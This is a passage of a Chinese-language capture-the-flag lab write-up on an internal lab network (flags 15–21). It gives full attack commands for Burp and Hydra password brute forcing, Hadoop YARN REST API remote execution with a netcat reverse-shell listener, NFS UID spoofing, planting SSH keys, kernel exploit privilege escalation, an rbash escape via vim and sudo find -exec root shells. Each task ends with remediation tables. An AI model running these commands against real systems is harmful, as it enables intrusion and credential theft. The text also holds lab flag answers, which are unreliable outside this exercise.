+在burpsuite中切换至Project options选项，设置SOCKS Proxy配置模块为127.0.0.1:2222。切换到proxy选项卡，确认burp自身的监听端口设置且已勾选生效,并将intercepted设置为off状态。
+在浏览器配置代理后，在bp拦截登录请求并重放爆破。<img src="00d327ca7d159b78da08c85ec4ab9675_MD5.webp" alt=""><img src="aa8d3263e1a6e970175701795c42106e_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>夺旗：flag15
+爆破密码为 777777 所以答案为 flag15{777777}<img src="57abbe3dec3f8d60b447f90577fac876_MD5.webp" alt=""><img src="62e37157eadded1d4ad14fb920669715_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-14">漏洞链条分析</h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>工具/技术</th>
+          <th>目的</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>信息收集</td>
+          <td>nmap、meterpreter</td>
+          <td>掌握内网拓扑结构，识别目标主机</td>
+      </tr>
+      <tr>
+          <td>内网穿透</td>
+          <td>reGeorg + Socks5</td>
+          <td>将 Kali 请求转发进内网，绕过边界防御</td>
+      </tr>
+      <tr>
+          <td>爆破攻击</td>
+          <td>Burp Suite Intruder</td>
+          <td>枚举弱口令，实现登录绕过</td>
+      </tr>
+      <tr>
+          <td>权限利用</td>
+          <td>后台访问权限</td>
+          <td>拿到 flag 信息</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-13">修复建议</h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞点</th>
+          <th>建议防护措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Redis、WebShell</td>
+          <td>限制网络访问、关闭 debug 接口、加认证</td>
+      </tr>
+      <tr>
+          <td>reGeorg 脚本</td>
+          <td>启用 WAF，对 URL pattern 检测、拦截 tunnel 脚本</td>
+      </tr>
+      <tr>
+          <td>管理后台弱口令</td>
+          <td>强密码策略、验证码、爆破检测</td>
+      </tr>
+      <tr>
+          <td>内网被代理转发</td>
+          <td>限制代理、端口监听，防火墙层做隔离</td>
+      </tr>
+      <tr>
+          <td>后台接口防爆破</td>
+          <td>接口限速、验证码、IP黑名单机制</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-14">总结</h3>
+<p><strong>目标内网 Web 系统未做访问控制，弱口令爆破缺乏防护机制，攻击者通过内网代理技术轻松完成密码破解</strong></p>
+<hr>
+<h1 id="6-实验六">6. 实验六</h1>
+<h2 id="问题十六">问题十六</h2>
+<h3 id="渗透流程-15">渗透流程</h3>
+<p>&lt;Hadoop未授权访问漏洞&gt;</p>
+<ol>
+<li>
+<p>扫描Hadoop端口
+复用之前使用proxychains搭建的反向代理扫描内网Hadoop服务端口，
+hadoop服务端口很多，这里选择 8030 端口扫描。
+发现 192.168.100.30 开放了 8030 端口。<img src="771827ea87533238ea2711d4368a9a78_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>建立反弹shell端口
+&lt;Hadoop未授权访问漏洞&gt;
+提供有默认开放在8088和8090的RESTAPI(默认前者)允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，RESTAPI将会开放在公网导致未授权访问的问题，那么黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为。</p>
+<p>在kali中新建一个终端，然后使用nc进行监听，nc -lvnp 6666</p>
+</li>
+<li>
+<p>Hadoop建立新应用
+申请新的application，直接通过cur进行POST请求，但由于服务器在内网需要使用proxychains进行代理，新建一个终端然后输入以下命令，得到一个application-id，用于下一步操作 <code>proxychains curl -v -X POST 'http://192.168.100.30:8088/ws/v1/cluster/apps/new-application'</code>
+<img src="ec58097d4d11b70cd2cd5ca238efc6aa_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>生成反弹shell数据包
+接下来构造json文件1.json。
+application-id可以快速替换:sed&rsquo;s/xxx/application-id/g 1.json &gt;11.json</p>
+</li>
+<li>
+<p>夺旗：flag16
+发送反弹shell数据包，
+执行命令(只能执行一次，若想再次使用，需要修改application id)，
+在监听终端 cat 答案为 flag16{5486ef0e33d7ec34}。
+<img src="bd109d7c50ad8bf3144ab8773aa7275c_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-15"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>序号</th>
+          <th>漏洞环节</th>
+          <th>利用方式</th>
+          <th>安全风险</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>Hadoop 默认配置不当</td>
+          <td>Hadoop 集群暴露 <strong>REST API</strong> 接口，无需身份验证即可访问管理功能（如任务提交、命令执行）</td>
+          <td>攻击者可远程控制 Hadoop 节点，执行任意命令，造成 RCE</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>反弹 Shell 利用</td>
+          <td>利用 API 提交构造好的命令，实现反向连接至攻击者控制的监听端口（如 <code>nc -lvnp 6666</code>）</td>
+          <td>攻击者可获得远程 Shell，进一步渗透或横向移动</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>应用创建与任务提交</td>
+          <td>通过 <code>/new-application</code> 接口获得 <code>application-id</code>，再向集群提交嵌入恶意命令的 JSON 任务</td>
+          <td>利用标准接口执行非授权操作，绕过安全审计与控制机制</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-14"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Hadoop 未授权访问</td>
+          <td>1. 禁用 Hadoop REST API 或仅限于内部网络访问。2. 在 API 接口中加入身份验证和访问控制，确保只有授权用户才能访问。3. 配置防火墙，限制对 Hadoop 管理端口（如 8088、8030 等）的外部访问。</td>
+      </tr>
+      <tr>
+          <td>反向 Shell 执行</td>
+          <td>1. 使用网络监控工具及时发现异常的反向连接请求。2. 针对反弹的 Shell 连接，使用端口扫描器定期扫描外部连接，检测非法连接。</td>
+      </tr>
+      <tr>
+          <td>API 安全性</td>
+          <td>1. 确保 API 中的命令执行不允许外部提交恶意操作。2. 对所有 API 操作进行参数验证，禁止执行任意系统命令。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-15"><strong>总结</strong></h3>
+<p>本次任务中，利用了 Hadoop 服务开放的 REST API 接口未做身份验证的漏洞，成功通过反弹 Shell 获取到目标系统的权限。通过代理与反向连接，能够成功执行恶意命令获取 flag。此类攻击在面对没有充分加固配置的系统时，极具威胁。</p>
+<h2 id="问题十七">问题十七</h2>
+<h3 id="渗透流程-16">渗透流程</h3>
+<p>&lt;NFS(Network File System)未授权访问漏洞&gt;</p>
+<ol>
+<li>
+<p>探测内网NFS服务
+直接使用 msf 中的 portscan 对 192.168.100.0/24网段 的
+2049 端口进行扫描</p>
+</li>
+<li>
+<p>挂载NFS目录
+可以找到192.168.100.50存在NFS服务，可以尝试使用<code>proxychains mount -tnsf</code>命令进行nsf的挂载，但是发现无法挂载<img src="e6e2a8a787dd3854779feb85c8dc3028_MD5.webp" alt=""></p>
+<p>原因可能是:</p>
+<ol>
+<li>网络问题:mount只是一个挂载工具，就算可以挂载上此网络服务，但是之后所有的访问就是通过挂载上的目录直接访问192.168.100.50地址了，但是本机并没有直达这个ip的路径，所以出现挂载失败的情况，那么想要找到一个可以直接连接到这个ip地址即可，</li>
+<li>客户端问题:需要连接的这台机器中安装的nfs的客户端程序，否则就算连接到了内网机器上，如果这台机器没有nfs的客户端，也利用不了</li>
+</ol>
+</li>
+<li>
+<p>登录Redis跳板机
+前面任务中已经知道了一个存在redis未授权访问漏洞的机器，且已经向其中写入了公钥，现在也可以直接使用ssh进行连接，查看是否存在nfs客户端工具
+在终端中输入下面命令，连接成功
+<code>proxychains ssh root@192.168.100.101</code><img src="44ab7938da7a9a791f6a1b8d0ca14a8f_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>使用Redis跳板机挂载NFS目录
+在redis机器中挂载192.168.100.50的ns服务，在挂载之前首先要知道nfs服务器导出的目录是什么，所以使用showmount命令来查看nfs的导出目录</p>
+<p>已经知道了nfs导出目录为/home，接下来可以直接挂载，输入命令 <code>mount -t nfs 192.168.100.50:/home /mnt</code></p>
+<p>已经挂载成功了，尝试进入user1目录中查看其中的flag文件
+显示没有权限进入，使用命令查看一下文件夹权限<img src="74b0357fc824c39b6cdc00dd01d80a4a_MD5.webp" alt=""></p>
+<p>从文件夹的属性中可以看出，只有uid为500的用户才有权限读写user1目录。接下来伪造所有者的uid来欺骗NFS服务器。</p>
+</li>
+<li>
+<p>伪造 SUID500的用户
+在kali的终端中输入下面命令创建一个uid为500的用户user1添加名为user1的用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">// 添加用户组，指定gid为500
+</span></span><span class="line"><span class="cl">groupadd -g <span class="m">500</span> user1 
+</span></span><span class="line"><span class="cl">// 创建用户，uid为500
+</span></span><span class="line"><span class="cl">useradd -u <span class="m">500</span> -g user1 -s /bin/bash user1 -d /home/user1
+</span></span><span class="line"><span class="cl">mkdir /home/user1
+</span></span></code></pre></div></li>
+<li>
+<p>夺旗：flag17
+将home目录赋予user1用户权限:<code>chown-R500:500 /home/user1</code>
+切换到此用户，然后查看用户的uid值，uid值为500
+进入到/mnt/user1目录，可以看到 flag17{38b0b845490faadc}<img src="3fb0481b702e37548aa7268c692c9418_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-16"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>序号</th>
+          <th>漏洞环节</th>
+          <th>利用方式</th>
+          <th>安全风险</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>NFS 服务配置不当</td>
+          <td>NFS 服务未限制客户端来源，攻击者可通过内网扫描发现并挂载其共享目录</td>
+          <td>允许任意用户读取甚至修改服务器上的敏感文件</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>Redis 跳板机利用</td>
+          <td>通过 Redis 未授权访问上传公钥，攻击者可 SSH 登录 Redis 主机，并作为内网跳板访问其他资源</td>
+          <td>构建内网攻击通道，扩大攻击面</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>伪造用户身份</td>
+          <td>在本地创建 <code>uid=500</code> 的用户，模拟合法用户访问挂载目录 <code>/mnt/user1</code></td>
+          <td>绕过 NFS 基于 UID 的访问控制，访问受限目录</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>挂载并访问 NFS 目录</td>
+          <td>利用跳板机挂载 <code>/home</code> 目录至本地，直接在本地文件系统访问远程内容</td>
+          <td>提高数据操作效率，扩大信息泄露范围</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-15"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞点</th>
+          <th>修复措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>NFS 服务配置不当</td>
+          <td>- 在 <code>/etc/exports</code> 中配置 <strong>只允许可信 IP 段挂载</strong>（如 <code>192.168.100.0/24</code>）- 使用 <code>no_root_squash</code> 时需特别小心，避免将 NFS 权限映射为 root- 在防火墙中限制 NFS 服务端口（2049），不对外开放</td>
+      </tr>
+      <tr>
+          <td>Redis 未授权访问</td>
+          <td>- 启用 <code>requirepass</code> 设置访问密码- 修改 Redis 配置文件 <code>bind 127.0.0.1</code> 或 <code>protected-mode yes</code> 限制外网访问- 禁止写入 <code>.ssh/authorized_keys</code> 等敏感路径</td>
+      </tr>
+      <tr>
+          <td>用户 UID 伪造</td>
+          <td>- NFS 服务端应使用 <strong>身份映射（如 NFSv4 + Kerberos）</strong> 来加强用户验证- 禁止对非授权 UID 用户访问敏感目录- 在关键目录中设置访问审计和监控</td>
+      </tr>
+      <tr>
+          <td>内网横向跳跃</td>
+          <td>- 内网各服务间进行<strong>访问控制划分</strong>，使用最小权限原则配置网络访问- 建立日志审计系统，及时检测横向访问行为</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-16"><strong>总结</strong></h3>
+<p>本任务综合利用了多个常见漏洞（NFS 未授权访问 + Redis 跳板 + UID 伪造），构建了一条完整的 <strong>内网横向渗透链</strong>。攻击者通过弱访问控制实现远程目录挂载，并借助权限伪造技巧绕过用户限制，最终成功获取敏感文件。</p>
+<p>此类问题暴露了企业内部服务之间缺乏严格的访问控制与认证机制，<strong>配置错误+权限放松+缺少隔离</strong> 是被利用的主要根源。建议通过 <strong>访问控制加固、最小权限设计、统一身份认证机制</strong> 等手段构建更为稳固的内网防御体系。</p>
+<h2 id="问题十八">问题十八</h2>
+<h3 id="渗透流程-17">渗透流程</h3>
+<p>&lt;NFS 共享&gt; + &lt;SSH 无密码登录&gt; + &lt;内核提权漏洞&gt;
+获取内网网络文件服务器/root下的flag18</p>
+<p>从上一个任务中可以得到一些信息，nfs服务器中存在user1这个用户，
+且nfs服务将/home这个目录作为nfs共享的目录，其中有user1文件夹，
+这个文件夹很可能是user1用户的家目录，
+这样如果此服务器开放了ssh服务，
+我们可以向/home/user1的.ssh目录下新建一个authorized_keys文件，
+就很有可能可以在不需要知道user1用户密码的情况下进行ssh远程连接。</p>
+<ol>
+<li>
+<p>探测NFS是否开放SSH服务
+使用SSH测试是否开放了SSH服务。</p>
+</li>
+<li>
+<p>创建.ssh 目录
+进入本机的/home/user1/，创建.ssh/，然后生成密钥。
+为mnt/user1/创建.ssh/。
+然后把公钥复制到主机user1的ssh配置目录中<img src="ad8262cedcfb7cffe141fd805e8c02d2_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>SSH登录NFS服务器
+连接目标服务器，输入<code>ssh user1@192.168.100.50</code>，
+如果失败可能有2个原因:</p>
+<ol>
+<li>.ssh目录的权限必须是700</li>
+<li>.ssh/authorized_keys文件权限必须是600
+使用<code>chmod 700 /mnt/user1/.ssh</code>
+与<code>chmod 600 /mnt/user1/.ssh/authorized_keys</code>修改权限后重新连接</li>
+</ol>
+</li>
+<li>
+<p>内核信息收集
+尝试读取/root目录下的flag，发现没有权限
+<img src="ad8262cedcfb7cffe141fd805e8c02d2_MD5.webp" alt="">
+输入<code>uname -r</code>查看内核权限，尝试使用内核提权为root用户，
+从而读取/root目录下的flag。
+得到内核信息后，使用Kali系统中的 searchsploit工具，
+查找内核对应的提权代码命令为:<code>searchsploit centos kernel 2.6.x esc</code></p>
+</li>
+<li>
+<p>内核提权
+拿到提权的脚本后，需要传到192.168.100.50服务器(NFS)中，
+有2种方法可以实现</p>
+<ol>
+<li>将Redis服务器生成的id isa文件放到Kali中，实现Kal免密登录到NFS服务器，然后上传</li>
+<li>修改NFS服务器的user1用户密码，Kali登录到NFS服务器，然后上传
+然后将文件复制到/mnt/user1中，也就是传到了NFS服务器中
+在Redis服务器中，使用user1免密登录到192.168.100.50
+编译此c文件
+将文件添加可执行权限
+执行此文件 ./exp 执行提权<img src="86514ddf3cfb484b3b158ea79b4c9f1a_MD5.webp" alt=""></li>
+</ol>
+</li>
+<li>
+<p>夺旗：flag18
+提权成功后，进入/root/查看 flag18{71cd5d36e8c32175}<img src="9541955e71708e2f95580c299389e05b_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-17"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>步骤</th>
+          <th>漏洞描述</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>1. NFS 配置不当</strong></td>
+          <td>攻击者通过 NFS 探测到目标机器上的共享目录（如 <code>/home</code>），并访问到 <code>user1</code> 用户的家目录。</td>
+      </tr>
+      <tr>
+          <td><strong>2. SSH 无密码登录</strong></td>
+          <td>攻击者将公钥插入 <code>user1</code> 用户的 <code>.ssh/authorized_keys</code> 文件中，从而实现免密码 SSH 登录，绕过传统的密码验证。</td>
+      </tr>
+      <tr>
+          <td><strong>3. 内核提权漏洞</strong></td>
+          <td>攻击者通过查询系统内核版本并查找相关提权漏洞，利用漏洞脚本获得 root 权限。</td>
+      </tr>
+      <tr>
+          <td><strong>4. 上传提权脚本</strong></td>
+          <td>攻击者通过免密 SSH 登录或修改用户密码上传并执行提权脚本，从而成功提升权限并访问 <code>/root/flag18</code>。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-16"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>NFS 未授权访问</strong></td>
+          <td>1. 配置 NFS 访问控制，确保只有授权的 IP 可以挂载共享目录。 2. 禁止通过 NFS 共享敏感目录，尤其是 <code>/home</code> 或 <code>/root</code> 等目录。</td>
+      </tr>
+      <tr>
+          <td><strong>SSH 无密码登录</strong></td>
+          <td>1. 在 SSH 配置中启用 <strong>密码认证</strong>，禁止使用仅基于公钥的认证。 2. 限制公钥认证的使用，只允许授权用户添加公钥。</td>
+      </tr>
+      <tr>
+          <td><strong>内核提权漏洞</strong></td>
+          <td>1. 定期 <strong>更新操作系统</strong>，确保安装了最新的安全补丁。 2. 启用 <strong>SELinux</strong> 或 <strong>AppArmor</strong> 等安全增强机制，以限制进程权限。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-17"><strong>总结</strong></h3>
+<p>本任务的成功入侵依赖于 <strong>NFS 配置不当</strong>、<strong>SSH 无密码登录</strong> 和 <strong>内核提权漏洞</strong>。要有效防范此类攻击，需确保 <strong>NFS 访问控制</strong> 严格、<strong>SSH 安全配置</strong> 完善，并定期 <strong>更新操作系统和内核</strong>，同时启用 <strong>安全增强机制</strong>，如 SELinux 或 AppArmor。</p>
+<hr>
+<h1 id="7-实验七">7. 实验七</h1>
+<h2 id="问题十九">问题十九</h2>
+<h3 id="渗透流程-18">渗透流程</h3>
+<p>&lt;弱口令爆破&gt;
+使用上一任务中的用户信息，扫描网络中使用此用户信息的服务器，读取用户目录下的flag。</p>
+<ol>
+<li>
+<p>扫描内网SSH端口
+登录一台SSH服务器，需要知道IP、端口、用户名、密码4个要素，已知用户名，所以需要以下步骤</p>
+<ol>
+<li>扫描内网哪些服务器开放了22端口</li>
+<li>对开放端口的服务进行密码破解
+使用 msf 中的 portscan模块，然后指定192.168.100.0/24网络扫描<img src="115967094347a5e7c1ee854829f51385_MD5.webp" alt=""></li>
+</ol>
+</li>
+<li>
+<p>使用user1破解内网ssh口令
+破解SSH一种是使用msf自带的ssh爆破工具，另一种使用hydra，
+课程使用MSF自带模块进行爆破。
+登录某台ssh需要两个信息，一个是用户名，另一个是密码，
+用户名已经指定，密码需要爆破，
+kali操作机中提供了password-top1000.txt文件。
+网络中存在多个服务器开放SSH，需要逐个爆破。<img src="e620756a6ebe62bd14fab75c773e1aba_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>夺旗：flag19
+使用爆破出来的密码进行登录，在终端中输入如下命令，然后读取/home/user1目录下的flag内容
+<code>proxychains ssh user1@192.168.100.60</code>
+发现读取动作受限，因为使用rbash，但是目的只是想读取文件，
+可以使用vim flag19来查看，flag19{33407fdc8ce55aa1}。
+<img src="67905f07aa5c3cceb63c5eb09b784f64_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-18"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞阶段</th>
+          <th>漏洞描述</th>
+          <th>漏洞利用</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>网络扫描和 SSH 爆破</strong></td>
+          <td>攻击者扫描内网中的 SSH 服务并对目标进行密码爆破。</td>
+          <td>使用 <strong>Metasploit</strong> 或 <strong>Hydra</strong> 进行 SSH 密码爆破。</td>
+      </tr>
+      <tr>
+          <td><strong>rbash 限制绕过</strong></td>
+          <td><strong>rbash</strong> 限制了用户执行某些命令，但允许使用编辑器查看文件内容。</td>
+          <td>利用 <strong>vim</strong> 通过文件路径直接访问敏感文件，绕过限制。</td>
+      </tr>
+      <tr>
+          <td><strong>内网扫描和暴露端口</strong></td>
+          <td>内网中暴露的 SSH 服务端口可供攻击者进行扫描和入侵。</td>
+          <td>使用 <strong>Metasploit</strong> 进行端口扫描，发现开放的 SSH 服务并利用。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-17"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>SSH 密码爆破</strong></td>
+          <td>1. 启用 <strong>SSH 密钥认证</strong>，禁止密码登录。 2. 实施 <strong>账户锁定机制</strong>，多次密码错误尝试后自动锁定账户。 3. 使用 <strong>强密码策略</strong>，避免使用弱密码。</td>
+      </tr>
+      <tr>
+          <td><strong>rbash 限制绕过</strong></td>
+          <td>1. 避免将敏感文件放在容易访问的位置。 2. 对用户的 rbash 环境进行严格的权限控制，禁止编辑器等工具的使用。</td>
+      </tr>
+      <tr>
+          <td><strong>内网扫描和暴露端口</strong></td>
+          <td>1. 对内网端口进行合理的访问控制，限制对敏感端口（如 SSH）的访问。 2. 使用 <strong>防火墙</strong> 和 <strong>网络隔离</strong> 来阻止不必要的端口暴露。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-18"><strong>总结</strong></h3>
+<p>本任务通过 <strong>rbash shell 限制</strong> 和 <strong>SSH 密码爆破</strong> 漏洞，成功获得了对目标机器的访问权限，并通过绕过 shell 限制读取了 <strong>flag19</strong> 文件。尽管 <strong>rbash</strong> 提供了一定的限制，但如果攻击者通过合适的工具绕过这些限制，仍然能够实现目标任务。</p>
+<h2 id="问题二十">问题二十</h2>
+<h3 id="渗透流程-19">渗透流程</h3>
+<p>&lt;SSH 爆破&gt; + &lt;rbash突破&gt;
+获取服务器/root/ 下的flag。</p>
+<ol>
+<li>
+<p>突破 Linux的 rbash
+如果要提权的话首先需要突破rbash的限制，获得一个正常的bash。
+利用vim程序的功能突破受限shell，连接到 192.168.100.60 后，
+在终端中输入vim。然后直接输入:<code>set shell=/bin/bash</code>
+回车后再输入:shell，这样会退出vim，进入一个新的shell，这是已经是正常的bash了。
+设置 <code>PATH=/home/user1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></p>
+</li>
+<li>
+<p>确认当前用户 sudo权限
+查看允许当前用户通过sudo执行的命令，在终端输入sudo-l <img src="0509e7b725233c05f41457310f1a8ebf_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>夺旗：flag20
+查询出user1可以通过sudo命令执行find，则存在提权的可能性，输入命令，
+如果提示输入密码，请输入前边任务爆破成功的user1密码
+<code>sudo find/-name ls -exec /bin/bash \;</code>
+然后读取/root/ 下的 flag20{1f9af0fb69497927}。<img src="319798b4da04f8d498aafa4dae33adbe_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-19"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>类型</th>
+          <th>问题描述</th>
+          <th>风险等级</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>SSH 弱口令</td>
+          <td>user1 密码可被暴力破解</td>
+          <td>高</td>
+      </tr>
+      <tr>
+          <td>rbash绕过</td>
+          <td>用户可通过 Vim / less / awk / nano 等工具绕出受限 shell</td>
+          <td>中</td>
+      </tr>
+      <tr>
+          <td>sudo 配置不当</td>
+          <td>允许低权限用户以 root 权限执行 <code>find</code></td>
+          <td>高</td>
+      </tr>
+      <tr>
+          <td>提权路径缺乏限制</td>
+          <td>利用 <code>-exec</code> 参数直接执行命令获取 root</td>
+          <td>高</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-18"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞点</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>SSH 弱口令</td>
+          <td>强制使用高强度密码，限制失败登录尝试次数，可启用 Fail2Ban。</td>
+      </tr>
+      <tr>
+          <td>rbash 绕过</td>
+          <td>禁用用户使用 Vim / less / awk 等可逃逸的交互工具，或使用 AppArmor 限制进程行为。</td>
+      </tr>
+      <tr>
+          <td>sudo 配置</td>
+          <td>使用 <code>NOPASSWD</code> 时指定白名单命令与参数，不应开放泛用工具（如 <code>find</code>、<code>bash</code>）。</td>
+      </tr>
+      <tr>
+          <td>用户隔离</td>
+          <td>建议部署时使用非 root 容器或非 root 用户沙箱技术，限制提权面。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-19"><strong>总结</strong></h3>
+<p>该任务核心是对低权限用户的 <strong>提权链分析与绕过技巧</strong>，说明了以下几点：</p>
+<ul>
+<li>即使部署了 <code>rbash</code>，若未配合限制可执行程序，极易被绕过；</li>
+<li><code>sudo</code> 权限一旦配置不当（尤其是类似 <code>find</code>, <code>vim</code>, <code>awk</code> 等工具），可轻易被用作 <strong>提权工具链</strong>；</li>
+<li>即使是单用户权限泄露，也可能导致 root 权限获取。</li>
+</ul>
+<h2 id="问题二十一">问题二十一</h2>
+<h3 id="渗透流程-20">渗透流程</h3>
+<p>&lt;弱口令漏洞&gt;
+获取管理员电脑的administrator密码（flag21）</p>
+<ol>
+<li>
+<p>信息收集
+查看secure日志：
+从上一任务获取的机器shell中读取ssh登录日志，
+查找内网中哪个ip登录了192.168.100.0/24 区域中的机器，
+因为管理员一般都会使用远程管理服务器的方式，
+而远程管理linux服务器最常用的方式就是远程登录ssh然后进行管理。
+Linux服务器中存放ssh的登录日志在/var/log目录下，
+文件名称以secure开头，/ar/log目录中的文件。</p>
+<p>ssh登录成功和失败在secure文件中都会有明显的标识，
+现在是需要寻找登录成功的日志，用以查找疑似管理员登录的ip地址，
+而登录成功的标志为Accepted，对log目录下的所有文件进行查找。</p>
+<p>其中的192.168.8.94的ip所在网络是新出现的，
+猜测此ip就是网络管理电脑的ip，使用msf中的portscan模块进行扫描，
+但是在使用之前需要先将192.168.8.0/24网络添加到msf的路由中。</p>
+</li>
+<li>
+<p>扫描目标IP对应端口
+输入background退出meterpreter会话，
+使用 auxiliary/scanner/portscan/tcp模块 对新的IP进行端口扫描。</p>
+<p>从得到的信息中可以看出这很可能是一台windows机器，并且开放了445端口，
+尝试使用hydra爆破这台机器的smb用户名和密码，
+因为其他用户名我们目前不知道，所以使用administrator作为用户名进行爆破，
+密码使用/root目录下的password-top1000.txt，
+在终端中输入:
+<code>proxychains hydra -l administrator -P /rootpassword-top1000.txt 192.168.8.94 smb -V</code></p>
+</li>
+<li>
+<p>夺旗：flag21
+爆破出来的密码就是 flag21{1234.com}。<img src="e1a62755ca6176d5d48f1e4afad5be0a_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-20"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞阶段</th>
+          <th>漏洞描述</th>
+          <th>漏洞利用方式</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>SSH 登录日志泄露</strong></td>
+          <td><code>/var/log/secure</code> 文件中暴露了管理员登录 IP，可被攻击者用于进一步侦察。</td>
+          <td>使用 <code>grep &quot;Accepted&quot;</code> 分析 SSH 成功登录记录，推测管理终端位置。</td>
+      </tr>
+      <tr>
+          <td><strong>SMB 服务暴露</strong></td>
+          <td>管理端口（445）未做访问控制，对外开放。</td>
+          <td>使用 Metasploit 扫描 SMB 服务端口，判断是否存在攻击面。</td>
+      </tr>
+      <tr>
+          <td><strong>弱口令攻击</strong></td>
+          <td>管理员账户使用了易被猜中的常见密码。</td>
+          <td>使用 Hydra 工具进行基于字典的 SMB 密码爆破，成功获取密码。</td>
+      </tr>
+      <tr>
+          <td><strong>缺乏暴力破解防护</strong></td>
+          <td>没有限制登录失败次数或设置锁定策略。</td>
+          <td>可无限尝试密码组合，暴力破解成为可行路径。</td>
+      </tr>
+      <tr>
+          <td><strong>代理逃逸检测</strong></td>
+          <td>攻击过程通过 Proxychains 发起，规避网络审计。</td>
+          <td>Proxychains 避免直接暴露攻击来源，绕过简单防火墙规则。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-19"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>SSH 登录日志泄露</strong></td>
+          <td>1. 定期审计 SSH 登录日志，配置 <strong>审计告警系统</strong>。2. 使用工具（如 logwatch、fail2ban）及时检测异常登录。</td>
+      </tr>
+      <tr>
+          <td><strong>SMB 服务暴露</strong></td>
+          <td>1. 限制 445 端口访问，仅允许可信主机连接。2. 使用 VLAN 或防火墙进行网络隔离。</td>
+      </tr>
+      <tr>
+          <td><strong>弱口令及暴力破解</strong></td>
+          <td>1. 禁用默认账户如 <code>administrator</code>，或重命名后启用。2. 强制执行 <strong>复杂密码策略</strong>（长度、字符集、周期更新）。3. 启用 <strong>账户锁定机制</strong>：N 次失败登录后锁定账户。</td>
+      </tr>
+      <tr>
+          <td><strong>SMB 访问认证机制</strong></td>
+          <td>1. 引入 <strong>多因素认证（MFA）</strong>，增加认证强度。2. 通过组策略限制远程访问策略及账户登录行为。</td>
+      </tr>
+      <tr>
+          <td><strong>Proxychains 匿名访问</strong></td>
+          <td>1. 部署 <strong>出入口网络审计与监控</strong>，识别代理通道行为。2. 启用 <strong>深度包检测（DPI）</strong>，分析加密流量中的异常访问模式。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-20"><strong>总结</strong></h3>
